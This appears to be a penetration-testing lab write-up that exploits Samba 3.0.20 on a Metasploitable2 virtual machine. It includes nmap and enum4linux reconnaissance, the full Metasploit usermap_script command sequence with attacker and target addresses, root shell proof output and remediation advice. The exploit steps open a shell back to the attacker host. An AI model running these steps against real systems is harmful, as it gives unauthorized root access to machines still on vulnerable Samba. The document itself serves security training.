# Metasploitable2 – Samba 3.0.20 (Port 445)

**Date:** 2025-09-05  
**Target:** 192.168.56.101  
**Attacker:** Kali Linux 2025.2 (192.168.56.102)  

---

## Recon

Nmap identified port 445 open running Samba 3.0.20:

```bash
nmap -sV -p 445 192.168.56.101 -oN nmap_samba_results.txt

Results showed:
- Service: netbios-ssn
- Version: Samba smbd 3.x (workgroup: WORKGROUP)
Additional enumeration with enum4linux confirmed available shares and user accounts:
enum4linux -a 192.168.56.101 | tee smb_enum_results.txt

Exploitation (Metasploit)
Using the usermap_script exploit in Metasploit:
msfconsole
use exploit/multi/samba/usermap_script
set RHOST 192.168.56.101
set LHOST 192.168.56.102
exploit

Proof of Compromise
Successful exploitation resulted in a root shell:
whoami
root

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

id
uid=0(root) gid=0(root)

Artifacts
  - [Nmap results](./metasploitable2/nmap_samba_results.txt)
  - [SMB enumeration](./metasploitable2/smb_enum_results.txt)
  - Screenshot: ![Root shell Samba](./metasploitable2/images/proof.samba.png)

Remediation
Upgrade Samba: Patch to a supported version (≥ 3.5.x).
Restrict access: Limit SMB service exposure to trusted hosts only.
Use firewalls: Block port 445 from untrusted networks.
Harden configs: Disable anonymous logins and enforce strong authentication.
---


